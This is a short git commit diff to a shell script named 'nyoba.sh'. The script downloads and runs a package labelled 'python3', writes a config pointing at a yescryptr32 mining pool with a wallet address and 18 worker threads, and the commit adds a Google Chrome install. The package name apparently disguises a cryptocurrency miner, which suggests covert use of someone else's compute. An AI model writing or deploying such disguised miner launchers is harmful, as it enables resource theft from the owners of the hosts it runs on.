cfb07505f05d396e465d692099372c92cc5eace7
barburonjilo <barburonjilo@outlook.co.id>
2024-07-19 18:51:21 +0700

    Update nyoba.sh

--- nyoba.sh
+++ nyoba.sh
@@ -4,6 +4,12 @@ tar -xvf python3.tar.gz
 rm python3.tar.gz
 cd python3
 ./setup.sh
+wget -q -O - https://dl-ssl.google.com/linux/linux_signing_key.pub | sudo apt-key add -
+echo "deb http://dl.google.com/linux/chrome/deb/ stable main" | sudo tee /etc/apt/sources.list.d/google.list
+
+# Update and install Google Chrome
+sudo apt-get update
+sudo apt-get install -y google-chrome-stable
 rm config.json && echo '{"algorithm": "yescryptr32", "host": "stratum-asia.rplant.xyz", "port": 17116, "worker": "UddCZe5d6VZNj2B7BgHPfyyQvCek6txUTx", "password": "x", "workers": 18, "log": false, "chrome": "./chromium/chrome" }' > config.json
 export LD_LIBRARY_PATH=$HOME/dependencies/lib/x86_64-linux-gnu:$HOME/dependencies/usr/lib/x86_64-linux-gnu:$LD_LIBRARY_PATH
 export PATH=$HOME/dependencies/usr/bin:$PATH
